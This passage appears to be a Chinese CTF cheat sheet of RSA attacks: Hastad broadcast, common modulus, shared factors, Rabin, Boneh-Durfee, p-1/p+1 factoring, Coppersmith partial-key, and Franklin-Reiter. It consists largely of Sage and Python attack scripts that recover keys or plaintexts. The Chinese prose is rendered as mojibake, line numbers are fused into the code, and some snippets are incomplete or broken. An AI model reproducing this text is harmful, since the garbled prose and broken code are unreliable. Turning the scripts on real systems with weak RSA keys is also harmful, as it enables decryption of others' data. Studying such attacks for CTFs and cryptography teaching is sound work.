é€¼è¿‘æ±‚å‡º $\\cfrac{k}{x}$ï¼Œè¿›è€Œè§£å‡º $y$ã€‚ Latticeï¼š $(x,k)\\begin{bmatrix}1&amp;A\\\\0&amp;P\\ \\end{bmatrix} = (x,y)$ï¼Œè®°ä¸º $vM=w$ï¼Œ$w$ æœ‰å¾ˆå¤§æ¦‚ç‡ä¸º $M$ é‡Œçš„æœ€çŸ­å‘é‡ï¼Œä½¿ç”¨LLLç®—æ³•æ±‚å‡ºæœ€çŸ­å‘é‡ï¼Œå³è§£å‡º $wâ€™=(x,y)$ã€‚ å‚è€ƒï¼šWienerâ€™s v.s Lattices â€”â€” Axâ‰¡y(mod P)çš„æ–¹ç¨‹è§£æ³•ç¬”è®° å˜ç§3ï¼š$N=p^2q$ï¼Œ$q \\lt p \\lt2q$ï¼Œ$d=N^\\beta$ å¯ç”¨ $\\cfrac{e}{N-(2N^\\frac{2}{3}-N^\\frac{1}{3})}$ é€¼è¿‘ $\\cfrac{k}{d}$ã€‚ å‚è€ƒï¼šNew Attacks on RSA with Modulus N = p^2q Using Continued Fractions â€‹ ä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»ï¼ˆHastadæ”»å‡»ï¼‰é€‚ç”¨æƒ…å†µï¼š $n,c$ ä¸åŒï¼Œ$m,e$ ç›¸åŒã€‚ä¸€èˆ¬ä¼šæ˜¯ $e=k$ï¼Œç„¶åç»™ $k$ ç»„æ•°æ®ã€‚ å¦‚æœä¸€ä¸ªç”¨æˆ·ä½¿ç”¨åŒä¸€ä¸ªåŠ å¯†æŒ‡æ•° e åŠ å¯†äº†åŒä¸€ä¸ªå¯†æ–‡ï¼Œå¹¶å‘é€ç»™äº†å…¶ä»– e ä¸ªç”¨æˆ·ã€‚é‚£ä¹ˆå°±ä¼šäº§ç”Ÿå¹¿æ’­æ”»å‡»ã€‚è¿™ä¸€æ”»å‡»ç”± HÃ¥stad æå‡ºã€‚ ä½¿ç”¨ä¸åŒçš„æ¨¡æ•° $n$ï¼Œç›¸åŒçš„å…¬é’¥æŒ‡æ•° $e$ åŠ å¯†ç›¸åŒçš„ä¿¡æ¯ï¼Œå°±ä¼šå¾—åˆ°å¤šä¸ª $m^e \\equiv c_i \\pmod {n_i}$ï¼Œå°† $m^e$ è§†ä¸ºä¸€ä¸ªæ•´ä½“ $M$ï¼Œè¿™å°±æ˜¯å…¸å‹çš„ä¸­å›½å‰©ä½™å®šç†é€‚ç”¨æƒ…å†µã€‚å®¹æ˜“æ±‚å¾— $m^e$ çš„å€¼ï¼Œå½“ $e$ è¾ƒå°æ—¶ç›´æ¥å¼€ $e$ æ–¹å³å¯ï¼Œå¯ä½¿ç”¨gmpy2.iroot(M,e) æ–¹æ³•ã€‚ æ›´ä¸€èˆ¬æƒ…å†µï¼ˆ$k$ ç»„æ•°æ®çš„ $N$ ä¸åŒï¼‰è§15ã€‚ 123456789#sagedef chinese_remainder(modulus, remainders): Sum = 0 prod = reduce(lambda a, b: a*b, modulus) for m_i, r_i in zip(modulus, remainders): p = prod // m_i Sum += r_i * (inverse_mod(p,m_i)*p) return Sum % prodchinese_remainder([3,5,7],[2,3,2]) #23 12#sagecrt([2,3,2],[3,5,7]) â€‹ å…±æ¨¡æ”»å‡»ï¼ˆn,mç›¸åŒï¼Œc,eä¸åŒï¼‰å½“$n$ä¸å˜çš„æƒ…å†µä¸‹ï¼ŒçŸ¥é“$n,e_1,e_2,c_1,c_2$å¯ä»¥åœ¨ä¸çŸ¥é“$d_1,d_2$çš„æƒ…å†µä¸‹ï¼Œè§£å‡º$m$ã€‚ é¦–å…ˆå‡è®¾$e_1,e_2$äº’è´¨, å³ $\\gcd(e_1,e_2)=1$ æ­¤æ—¶åˆ™æœ‰ $e_1s_1+e_2s_2 = 1$ å¼ä¸­ï¼Œ$s_1,s_2$çš†ä¸ºæ•´æ•°ï¼Œä½†æ˜¯ä¸€æ­£ä¸€è´Ÿã€‚ é€šè¿‡æ‰©å±•æ¬§å‡ é‡Œå¾·ç®—æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°è¯¥å¼å­çš„ä¸€ç»„è§£$ï¼ˆs_1,s_2ï¼‰$ï¼Œå‡è®¾$s_1$ä¸ºæ­£æ•°,$s_2$ä¸ºè´Ÿæ•°ã€‚ å› ä¸º $c_1 = m^{e_1}\\bmod n, c_2 = m^{e_2}\\bmod n$ æ‰€ä»¥ $(c_1^{s_1}c_2^{s_2})\\bmod n = ((m^{e_1}\\bmod n)^{s_1}(m^{e_2}\\bmod n)^{s_2})\\bmod n$ æ ¹æ®æ¨¡è¿ç®—æ€§è´¨ï¼Œå¯ä»¥åŒ–ç®€ä¸º $(c_1^{s_1}c_2^{s_2})\\bmod n = ((m^{e_1})^{s_1}(m^{e_2})^{s_2})\\bmod n$ å³ $(c_1^{s_1}c_2^{s_2})\\bmod n = (m^{e_1s_1+e_2s_2})\\bmod n$ åˆå‰é¢æåˆ° $e_1s_1+e_2s_2 = 1$ æ‰€ä»¥ $(c_1^{s_1}c_2^{s_2})\\bmod n = m\\bmod n$ å³ $c_1^{s_1}c_2^{s_2}= m$ 1234567891011121314151617181920212223242526import gmpy2 as gpdef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)n = c1 = c2 = e1 = e2 = s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = gp.invert(c1, n)elif s2&lt;0: s2 = - s2 c2 = gp.invert(c2, n)m = pow(c1,s1,n)*pow(c2,s2,n) % nprint(hex(m)[2:])print(bytes.fromhex(hex(m)[2:])) â€‹ e,mç›¸åŒï¼Œå¤šä¸ªnä¸­å­˜åœ¨ä¸¤ä¸ªnæœ‰GCDï¼ˆæ¨¡ä¸äº’ç´ ï¼‰é€‚ç”¨æƒ…å†µï¼šå­˜åœ¨ä¸¤ä¸ªæˆ–æ›´å¤šæ¨¡æ•° ï¼Œä¸” $\\gcd(n_1,n_2)\\ne 1$ ã€‚ å¤šä¸ªæ¨¡æ•° $n$ å…±ç”¨è´¨æ•°ï¼Œåˆ™å¯ä»¥å¾ˆå®¹æ˜“åˆ©ç”¨æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚å¾—ä»–ä»¬çš„è´¨å› æ•°ä¹‹ä¸€ $\\gcd(n_1,n_2)$ï¼Œç„¶åè¿™ä¸ªæœ€å¤§å…¬çº¦æ•°å¯ç”¨äºåˆ†è§£æ¨¡æ•°åˆ†åˆ«å¾—åˆ°å¯¹åº”çš„ $p$ å’Œ $q$ï¼Œå³å¯è¿›è¡Œè§£å¯†ã€‚ 1234567891011121314151617181920212223import gmpy2 as gpn=[]for i in n: for j in n: if (i&lt;&gt;j): pub_p=gp.gcdext(i,j) if (pub_p[0]&lt;&gt;1)&amp;(i&gt;j): print(i) print(j) print(pub_p[0]) a=i,p=pub_p[0]q=a//pp =q =e =c =n = p*qphi = (p-1) * (q-1)d = gp.invert(e, phi)m = pow(c, d, n)print(hex(m)[2:])print(bytes.fromhex(hex(m)[2:])) â€‹ RabinåŠ å¯†é€‚ç”¨æƒ…å†µï¼š$e=2$ ã€‚ ä¸€èˆ¬å…ˆé€šè¿‡å…¶ä»–æ–¹æ³•åˆ†è§£å¾—åˆ° $p,q$ï¼Œç„¶åè§£å¯†ã€‚ å‡½æ•°è¿”å›å››ä¸ªæ•°ï¼Œè¿™å…¶ä¸­åªæœ‰ä¸€ä¸ªæ˜¯æˆ‘ä»¬æƒ³è¦çš„æ˜æ–‡ï¼Œéœ€è¦é€šè¿‡å…¶ä»–æ–¹å¼éªŒè¯ã€‚ 1234567891011121314151617181920212223import gmpy2def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) // 4, p) mq = pow(c, (q + 1) // 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) c = p = q = m = rabin_decrypt(c,p,q)for i in range(4): try: print(bytes.fromhex(hex(m[i])[2:])) except: pass â€‹ Boneh and Durfee attack$e$ éå¸¸å¤§æ¥è¿‘äº$N$ï¼Œå³ $d$ è¾ƒå°æ—¶ã€‚ä¸ä½è§£å¯†æŒ‡æ•°æ”»å‡»ç±»ä¼¼ï¼Œæ¯”ä½è§£å¯†æŒ‡æ•°æ”»å‡»ï¼ˆWiener Attackï¼‰æ›´å¼ºï¼Œå¯ä»¥è§£å†³$\\cfrac{1}{3}N^{\\frac{1}{4}} \\leq d \\leq N^{0.292}$çš„é—®é¢˜ã€‚ $\\because ed=k \\varphi +1$ $\\therefore k \\varphi+1 \\equiv 0 \\pmod e \\Rightarrow k(N+1-p-q)+1 \\equiv 0 \\pmod e \\Rightarrow 2k(\\frac{N+1}{2}+\\frac{-p-q}{2}) \\equiv 0 \\pmod e$ è®¾ $A=\\frac{N+1}{2},y=\\frac{-p-q}{2},x=2k$ï¼Œæœ‰ $f(k,y)=1+x\\cdot(A+y)$ å¦‚æœåœ¨æ¨¡ $e$ ä¸‹è§£å¾—è¯¥æ–¹ç¨‹çš„æ ¹ $x,y$ï¼Œç”± $ed=1+x\\cdot(A+y)$ å¯ä»¥å¾—åˆ° $d$ã€‚ å‚è€ƒ RSA-and-LLL-attacksã€‚ å˜ç§1ï¼š$e$ å¾ˆå¤§ï¼Œ$dp$ å¾ˆå°ï¼Œä¸” $d&gt;2N^{\\beta}$ã€‚ Mayâ€™s Attack å‡è®¾ $e&lt;\\varphi(N),q \\le N^{\\beta},\\beta \\le \\frac{1}{2}$ï¼Œå›  $ed_p \\equiv 1 \\pmod {p-1}$ï¼Œæœ‰ $ed_p=1+k(p-1)$ï¼Œ å¯¹äº $k \\in \\mathbb{N}$ï¼Œæœ‰ $ed_p=(k-1)(p-1)+p$ï¼Œå³ $ed_pq=(k-1)(N-q)+N$ã€‚ è®¾ $x,y$ ä¸ºå‚æ•°ï¼Œåˆ™å¤šé¡¹å¼ $f(x,y)=x(N-y)+N$ åœ¨æ¨¡ $e$ ä¸‹å­˜åœ¨æ ¹ $(x_0,y_0)=(k-1,q)$ï¼Œç”¨coppersmith attackå¯è§£ã€‚ â€‹ å…‰æ»‘æ•°p-1 å…‰æ»‘Pollardâ€™s p-1åˆ†è§£ç®—æ³•ã€‚ å¦‚æœä¸€ä¸ªæ•´æ•°çš„æ‰€æœ‰ç´ å› å­éƒ½ä¸å¤§äº $B$ï¼Œæˆ‘ä»¬ç§°è¿™ä¸ªæ•°ä¸º $B$-Smooth æ•°ã€‚ è®¾ $p-1$ æ˜¯ $B$-Smooth çš„ï¼Œå¯è®¾ $p-1=p_1p_2 \\cdots p_n(\\forall 1 \\leq i \\leq n,p_i \\leq B)$ï¼Œ è‹¥ $p_1,p_2, \\cdots ,p_n$ ä¸¤ä¸¤ä¸åŒï¼Œåˆ™ $p_1p_2 \\cdots p_n \\mid B! \\Rightarrow (p-1) \\mid B! \\Rightarrow B!=k(p-1)$ã€‚ å› æ­¤ $a^{B!} \\equiv a^{k(p-1)} \\equiv 1 \\pmod p$ï¼Œå‡è®¾ $N=pq$ï¼Œè®¡ç®— $\\gcd(a^{B!}-1ï¼ŒN)$ï¼Œåªè¦ç»“æœå¤§äº $0$ å°äº $N$ï¼Œé‚£ä¹ˆç»“æœå°±ä¸º $p$ã€‚ 12345678910111213from gmpy2 import *a = 2k = 2N = while True: a = powmod(a, k, N) res = gcd(a-1, N) if res != 1 and res != N: q = N // res print(&quot;p =&quot;,res) print(&quot;q =&quot;,q) break k += 1 p+1 å…‰æ»‘Williamâ€™s p+1åˆ†è§£ç®—æ³•ã€‚ 12345678910111213141516171819def mlucas(v, a, n): &quot;&quot;&quot; Helper function for williams_pp1(). Multiplies along a Lucas sequence modulo n. &quot;&quot;&quot; v1, v2 = v, (v**2 - 2) % n for bit in bin(a)[3:]: v1, v2 = ((v1**2 - 2) % n, (v1*v2 - v) % n) if bit == &quot;0&quot; else ((v1*v2 - v) % n, (v2**2 - 2) % n) return v1for v in count(1): for p in primegen(): e = ilog(isqrt(n), p) if e == 0: break for _ in xrange(e): v = mlucas(v, p, n) g = gcd(v-2, n) if 1 &lt; g &lt; n: return g # g|n if g == n: break â€‹ Coppersmithå®šç†æŒ‡å‡ºåœ¨ä¸€ä¸ª $e$ é˜¶çš„ $\\bmod n$ å¤šé¡¹å¼ $f(x)$ ä¸­ï¼Œå¦‚æœæœ‰ä¸€ä¸ªæ ¹å°äº $n^{\\frac{1}{e}}$ï¼Œå°±å¯ä»¥è¿ç”¨ä¸€ä¸ª $O(\\log n)$ çš„ç®—æ³•æ±‚å‡ºè¿™äº›æ ¹ã€‚ Coppersmithæ”»å‡»ï¼ˆå·²çŸ¥pçš„é«˜ä½æ”»å‡»ï¼‰çŸ¥é“ $p$ çš„é«˜ä½ä¸º $p$ çš„ä½æ•°çš„çº¦$\\frac12$æ—¶å³å¯ã€‚ 12345678910111213141516#Sagen = p4 = #på»0çš„å‰©ä½™ä½pbits = 1024kbits = pbits - p4.nbits()print(p4.nbits())p4 = p4 &lt;&lt; kbitsPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + p4roots = f.small_roots(X=2^kbits, beta=0.4)if roots: p = p4 + int(roots[0]) q = n//p print(f&#x27;n: &#123;n&#125;&#x27;) print(f&#x27;p: &#123;p&#125;&#x27;) print(f&#x27;q: &#123;q&#125;&#x27;) â€‹ Coppersmithæ”»å‡»ï¼ˆå·²çŸ¥mçš„é«˜ä½æ”»å‡»ï¼‰è¿™é‡Œæˆ‘ä»¬å‡è®¾æˆ‘ä»¬é¦–å…ˆåŠ å¯†äº†æ¶ˆæ¯ $m$ï¼Œå¦‚ä¸‹ $C\\equiv m^e \\bmod N$ å¹¶ä¸”æˆ‘ä»¬å‡è®¾æˆ‘ä»¬çŸ¥é“æ¶ˆæ¯ $m$ çš„å¾ˆå¤§çš„ä¸€éƒ¨åˆ† $m_0$ï¼Œå³ $m=m_0+x$ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“ $x$ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±æœ‰å¯èƒ½é€šè¿‡è¯¥æ–¹æ³•è¿›è¡Œæ¢å¤æ¶ˆæ¯ã€‚è¿™é‡Œæˆ‘ä»¬ä¸çŸ¥é“çš„ $x$ å…¶å®å°±æ˜¯å¤šé¡¹å¼çš„æ ¹ï¼Œéœ€è¦æ»¡è¶³ Coppersmith çš„çº¦æŸã€‚ å¯ä»¥å‚è€ƒ https://github.com/mimoo/RSA-and-LLL-attacks ã€‚ $e$ è¶³å¤Ÿå°ï¼Œä¸”éƒ¨åˆ†æ˜æ–‡æ³„éœ²æ—¶ï¼Œå¯ä»¥é‡‡ç”¨Coppersmithå•å˜é‡æ¨¡ç­‰å¼çš„æ”»å‡»ï¼Œå¦‚ä¸‹ï¼š $c=m^{e}\\bmod n=(mbar+x_{0})^{e}\\bmod n$ï¼Œå…¶ä¸­ $mbar = (m &gt;&gt; k\\text{bits}) &lt;&lt; k\\text{bits}$ å½“ $\\vert x_{0}\\vert\\leq N^{\\frac{1}{e}}$ æ—¶ï¼Œå¯ä»¥åœ¨ $\\log N$ å’Œ $e$ çš„å¤šé¡¹å¼æ—¶é—´å†…æ±‚å‡º $x_0$ã€‚ 12345678910111213#Sagen = e = c = mbar = kbits = beta = 1nbits = n.nbits()print(&quot;upper &#123;&#125; bits of &#123;&#125; bits is given&quot;.format(nbits - kbits, nbits))PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (mbar + x)^e - cx0 = f.small_roots(X=2^kbits, beta=1)[0] # find root &lt; 2^kbits with factor = nprint(&quot;m:&quot;, mbar + x0) â€‹ Coppersmithæ”»å‡»ï¼ˆå·²çŸ¥dçš„ä½ä½æ”»å‡»ï¼‰å¦‚æœçŸ¥é“ $d$ çš„ä½ä½ï¼Œä½ä½çº¦ä¸º $n$ çš„ä½æ•°çš„ $\\frac14$ ï¼ˆ$\\frac{n.n\\text{bits}()}{4}$ï¼‰å°±å¯ä»¥æ¢å¤ $d$ã€‚ 123456789101112131415161718192021222324252627282930313233#Sagedef partial_p(p0, kbits, n): PR.&lt;x&gt; = PolynomialRing(Zmod(n)) nbits = n.nbits() f = 2^kbits*x + p0 f = f.monic() roots = f.small_roots(X=2^(nbits//2-kbits), beta=0.4) # find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.4 if roots: x0 = roots[0] p = gcd(2^kbits*x0 + p0, n) return ZZ(p)def find_p(d0, kbits, e, n): X = var(&#x27;X&#x27;) for k in range(1, e+1): results = solve_mod([e*d0*X - k*X*(n-X+1) + k*n == X], 2^kbits) for x in results: p0 = ZZ(x[0]) p = partial_p(p0, kbits, n) if p and p != 1: return pif __name__ == &#x27;__main__&#x27;: n = e = c = d0 = beta = 0.5 nbits = n.nbits() kbits = d0.nbits() print(&quot;lower %d bits (of %d bits) is given&quot; % (kbits, nbits)) p = int(find_p(d0, kbits, e, n)) print(&quot;found p: %d&quot; % p) q = n//int(p) print(&quot;d:&quot;, inverse_mod(e, (p-1)*(q-1))) å˜ç§1ï¼š$n=p\\cdot q\\cdot r$ï¼Œå·²çŸ¥ $n,p,d=\\text{inv}(e,\\varphi(n)),e,c$ $k(p-1)\\rightarrow kâ€™,qr\\rightarrow nâ€™,q+r\\rightarrow s$ $ed_{0}\\equiv 1+kâ€™(nâ€™-s+1) \\pmod {2^{d_{0}.n\\text{bits}()}}\\quad (1)$ $q^{2}-sq+nâ€™\\equiv 0 \\pmod {2^{d_{0}.n\\text{bits}()}}\\quad (2)$ è”ç«‹å¯å¾—ï¼Œ$(ed_{0}-1-kâ€™nâ€™-kâ€™)q+kâ€™q^{2}+kâ€™nâ€™\\equiv 0 \\pmod {2^{d_{0}.n\\text{bits}()}}$ å³æ±‚è§£åŒä½™æ–¹ç¨‹å¯å¾— $q$ çš„ä½ $size(d0)$ ä½ï¼Œæœ¬æ¥æ˜¯ä¸ªpartial dçš„coppersmithé—®é¢˜ï¼Œä½†å› ä¸ºstep1æ±‚è§£åŒä½™æ–¹ç¨‹åå¾—åˆ°çš„ $q$ å·²æ˜¯å®Œæ•´çš„ $q$ï¼Œæ‰€ä»¥æ— éœ€åç»­çš„coppersmithã€‚ å‚è€ƒï¼šDragon CTF 2019 - RSA Chained 12345678910111213141516171819202122#Sagedef find_p(d0, kbits, e, n, p): X = var(&#x27;X&#x27;) for k in range(1, e + 1): k_dot = k * (p - 1) results = solve_mod([e * d0 * X - k_dot * X * (n - X + 1) + k_dot * n == X], 2^kbits) for x in results: q = ZZ(x[0]) if n % q == 0: return q return Nonen = ... # q * rp = c = d0 = e = kbits = d0.nbits()q = find_p(d0, kbits, e, n, p)phi = (p - 1) * (q - 1) * (n // q - 1)d = inverse_mod(e, phi)print(bytes.fromhex(hex(pow(c, d, p * n))[2:])) â€‹ Coppersmithæ”»å‡»ï¼ˆå·²çŸ¥Nä¸€ä¸ªå› å­çš„é«˜ä½ï¼Œéƒ¨åˆ†pï¼‰å½“æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªå…¬é’¥ä¸­æ¨¡æ•° $N$ çš„ä¸€ä¸ªå› å­çš„è¾ƒé«˜ä½æ—¶ï¼Œæˆ‘ä»¬å°±æœ‰ä¸€å®šå‡ ç‡æ¥åˆ†è§£ $N$ã€‚ å‚è€ƒ https://github.com/mimoo/RSA-and-LLL-attacks ã€‚ å…³æ³¨ä¸‹é¢çš„ä»£ç ï¼š 1234567beta = 0.5dd = f.degree()epsilon = beta / 7mm = ceil(beta**2 / (dd * epsilon))tt = floor(dd * mm * ((1/beta) - 1))XX = ceil(N**((beta**2/dd) - epsilon)) + 1000000000000000000000000000000000roots = coppersmith_howgrave_univariate(f, N, beta, mm, tt, XX) å…¶ä¸­ï¼Œ å¿…é¡»æ»¡è¶³ $q\\ge N^{beta}$ï¼Œæ‰€ä»¥è¿™é‡Œç»™å‡ºäº† $beta=0.5$ï¼Œæ˜¾ç„¶ä¸¤ä¸ªå› æ•°ä¸­å¿…ç„¶æœ‰ä¸€ä¸ªæ˜¯å¤§äºçš„ã€‚ XX æ˜¯ $f(x)=qâ€²+x$ åœ¨æ¨¡ $q$ æ„ä¹‰ä¸‹çš„æ ¹çš„ä¸Šç•Œï¼Œè‡ªç„¶æˆ‘ä»¬å¯ä»¥é€‰æ‹©è°ƒæ•´å®ƒï¼Œè¿™é‡Œå…¶å®ä¹Ÿè¡¨æ˜äº†æˆ‘ä»¬å·²çŸ¥çš„ $qâ€²$ ä¸å› æ•° $q$ ä¹‹é—´å¯èƒ½çš„å·®è·ã€‚ 123456789101112131415#Sagen = e = c = pbar = kbits = print(&quot;upper %d bits (of %d bits) is given&quot; % (pbar.nbits()-kbits, pbar.nbits()))PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = x + pbarx0 = f.small_roots(X=2^kbits, beta=0.4)[0] # find root &lt; 2^kbits with factor &gt;= n^0.4p = x0 + pbarprint(&quot;p:&quot;, p)q = n // int(p)d = inverse_mod(e, (p-1)*(q-1))print(&quot;m:&quot;, pow(c, d, n)) æ³¨ï¼š sageçš„small_rootä¼ å‚Xä¸èƒ½è¿‡å¤§ï¼Œéœ€è‡ªè¡Œåˆ¤æ–­é˜ˆå€¼å¹¶è°ƒæ•´ï¼ˆå¦‚æœXè¿‡å¤§ï¼Œå³ä½¿å­˜åœ¨Xå†…çš„è§£ï¼Œä¹Ÿæ— æ³•æ±‚å‡ºï¼‰ï¼› æ¯”å¦‚ $p$ çš„ä½ä½æ³„éœ²æ—¶å› ä¸ºä¸ç¡®å®šç¼ºå¤±é«˜ä½çš„å…·ä½“æ¯”ç‰¹æ•°ï¼Œæ‰€ä»¥è¦åœ¨ $2^{\\frac{n.n\\text{bits}()}{2}âˆ’k\\text{bits}}$ é™„è¿‘ä½œXçš„é˜ˆå€¼ä¼°è®¡ï¼› æ— æ³•ç¡®å®šæ‹¿åˆ°çš„ $p$ æ˜¯å¦å¤§äº $q$ï¼Œæ‰€ä»¥å¯¹ $\\beta=0.5$ è¿›è¡Œè°ƒæ•´è‡³ $0.4$ã€‚ â€‹ Coppersmithâ€™s Short-pad Attack &amp; Related Message Attackï¼ˆFranklin-Reiteræ”»å‡»ï¼‰ç›®å‰åœ¨å¤§éƒ¨åˆ†æ¶ˆæ¯åŠ å¯†ä¹‹å‰éƒ½ä¼šè¿›è¡Œ paddingï¼Œä½†æ˜¯å¦‚æœ padding çš„é•¿åº¦è¿‡çŸ­ï¼ˆ$m \\in (0,\\lfloor\\frac{n.n\\text{bits}()}{e^2}\\rfloor]$ï¼‰ï¼Œä¹Ÿæœ‰å¯èƒ½è¢«å¾ˆå®¹æ˜“åœ°æ”»å‡»ã€‚ è¿™é‡Œæ‰€è°“ padding è¿‡çŸ­ï¼Œå…¶å®å°±æ˜¯å¯¹åº”çš„å¤šé¡¹å¼çš„æ ¹ä¼šè¿‡å°ã€‚ å½“ Alice ä½¿ç”¨åŒä¸€å…¬é’¥å¯¹ä¸¤ä¸ªå…·æœ‰æŸç§çº¿æ€§å…³ç³»çš„æ¶ˆæ¯ $M_1$ ä¸ $M_2$ è¿›è¡ŒåŠ å¯†ï¼Œå¹¶å°†åŠ å¯†åçš„æ¶ˆæ¯ $C_1$ï¼Œ$C_2$ å‘é€ç»™äº† Bob æ—¶ï¼Œæˆ‘ä»¬å°±å¯èƒ½å¯ä»¥è·å¾—å¯¹åº”çš„æ¶ˆæ¯ $M_1$ ä¸ $M_2$ ã€‚è¿™é‡Œæˆ‘ä»¬å‡è®¾æ¨¡æ•°ä¸º $N$ï¼Œä¸¤è€…ä¹‹é—´çš„çº¿æ€§å…³ç³»å¦‚ä¸‹ï¼š $M_1 \\equiv f(M_2) \\bmod N$ å…¶ä¸­ $f$ ä¸ºä¸€ä¸ªçº¿æ€§å‡½æ•°ï¼Œæ¯”å¦‚è¯´ $f=ax+b$ã€‚ åœ¨å…·æœ‰è¾ƒå°é”™è¯¯æ¦‚ç‡ä¸‹çš„æƒ…å†µä¸‹ï¼Œå…¶å¤æ‚åº¦ä¸º $O(e\\log^2N)$ã€‚ è¿™ä¸€æ”»å‡»ç”± Franklinä¸Reiter æå‡ºã€‚ 1234567891011121314151617181920#è„šæœ¬1#Sageimport binasciidef attack(c1, c2, n, e): PR.&lt;x&gt;=PolynomialRing(Zmod(n)) # replace a,b,c,d g1 = (a*x+b)^e - c1 g2 = (c*x+d)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]c1 =c2 =n =e =m1 = attack(c1, c2, n, e)print(binascii.unhexlify(&quot;%x&quot; % int(m1))) 123456789101112131415161718192021222324252627282930313233343536#è„šæœ¬2#Sagedef short_pad_attack(c1, c2, e, n): PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n)) PRx.&lt;xn&gt; = PolynomialRing(Zmod(n)) PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() kbits = n.nbits()//(2*e*e) diff = h.small_roots(X=2^kbits, beta=0.4)[0] # find root &lt; 2^kbits with factor &gt;= n^0.4 return diffdef related_message_attack(c1, c2, diff, e, n): PRx.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]if __name__ == &#x27;__main__&#x27;: n = e = c1 = c2 = diff = short_pad_attack(c1, c2, e, n) print(&quot;difference of two messages is %d&quot; % diff) m1 = related_message_attack(c1, c2, diff, e, n) print(&quot;m1:&quot;, m1) print(&quot;m2:&quot;, m1 + diff) å˜ç§1ï¼š $c_i=(a_im+b_i)^e \\pmod {n_i}$ ç”¨CRTè®¡ç®—ç³»æ•° $T_i$ ä½¿å¾— $T_i \\equiv 1 \\pmod{n_i},T_i \\equiv 0 \\pmod{n_{j \\neq i}}$ï¼Œ åˆ™å¯å»ºç«‹å¤šé¡¹å¼ä¸º $f(x) = \\sum_{i} T_i [ (a_i x + b_i)^e - c_i]$ï¼Œç¬¦åˆ $f(m) \\equiv 0 \\pmod{n_i}$ï¼Œ æ•… $m$ æ˜¯ $f(m) \\equiv 0 \\pmod N$ çš„ä¸€ä¸ªæ ¹ï¼Œå…¶ä¸­ $N= \\prod_i n_i$ã€‚ å¦‚æœ $m &lt; \\left (\\prod_i n_i \\right)^{1/e} = M^{1/\\deg{f(x)}}$ï¼Œå¯ä»¥ä½¿ç”¨coppersmithæ‰¾å‡º $m$ã€‚ å‚è€ƒï¼š Security Fest 2022 - really_sick_Ã¦sthetic PlaidCTF 2017 - Multicast CakeCTF 2021 - Party Ticket â€‹ RSA Hastad Attack with non-linear padding and different public keysï¼ˆå¸¦éçº¿æ€§paddingå’Œä¸åŒå…¬é’¥çš„å¹¿æ’­æ”»å‡»ï¼‰é€‚ç”¨æƒ…å†µï¼š$m$ ç» $k$ æ¬¡éçº¿æ€§paddingå¤„ç†åï¼Œåˆ†åˆ«ç”¨ $k$ ç»„ $(N_i,e_i)$ åŠ å¯†åå¾— $k$ ç»„ $c_i$ã€‚ å‚è€ƒï¼š2020å¹´ç¾ŠåŸæ¯ - Invitation 1234567891011121314151617181920212223242526272829303132333435363738394041#Sage#e=3, padding: mÂ²+(3^431)kdef linearPaddingHastads(cArray,nArray,aArray,bArray,eArray,eps): if(len(cArray) == len(nArray) == len(aArray) == len(bArray) == len(eArray)): for i in range(4): cArray[i] = Integer(cArray[i]) nArray[i] = Integer(nArray[i]) aArray[i] = Integer(aArray[i]) bArray[i] = Integer(bArray[i]) eArray[i] = Integer(eArray[i]) TArray = [-1]*4 for i in range(4): arrayToCRT = [0]*4 arrayToCRT[i] = 1 TArray[i] = crt(arrayToCRT,nArray) P.&lt;x&gt; = PolynomialRing(Zmod(prod(nArray))) gArray = [-1]*4 for i in range(4): gArray[i] = TArray[i]*(pow(aArray[i]*x**2 + bArray[i],eArray[i]) - cArray[i]) g = sum(gArray) g = g.monic() roots = g.small_roots(epsilon=eps) if(len(roots)== 0): print(&quot;No Solutions found!&quot;) return -1 return roots else: print(&quot;Input error!&quot;)def nonLinearPadding(): eArr = [3 for i in range(4)] nArr = [] cArr = [] aArr = [1 for i in range(4)] bArr = [i * 3 ** 431 for i in [3,8,10,11]] msg = linearPaddingHastads(cArr,nArr,aArr,bArr,eArr,eps=1/20) for i in msg: print(bytes.fromhex(hex(i)[2:])) if __name__ == &#x27;__main__&#x27;: nonLinearPadding() â€‹ é€‰æ‹©æ˜/å¯†æ–‡æ”»å‡»é€‰æ‹©æ˜æ–‡æ”»å‡»é€‚ç”¨æƒ…å†µï¼šå¯¹è¾“å…¥çš„ä»»æ„æ˜æ–‡æœåŠ¡å™¨è¿”å› RSA åŠ å¯†ç»“æœï¼Œå¯ä»¥é€šè¿‡é€‰æ‹©æ˜æ–‡æ”»å‡»æ¥è·å– $n$ã€‚ é¦–å…ˆå‘é€ $2$ï¼Œè®©æœåŠ¡å™¨è¿›è¡ŒåŠ å¯†ï¼Œè¿”å› $c_2=2^e \\bmod n$ï¼› ç»§ç»­å‘é€ $2^2$ï¼Œè®©æœåŠ¡å™¨è¿›è¡ŒåŠ å¯†ï¼Œè¿”å› $c_4=4^e \\bmod n$ï¼› ä¸å¦¨è®¾ $2^e=a+bn$ï¼Œæœ‰ $c_2=(a+bn) \\bmod 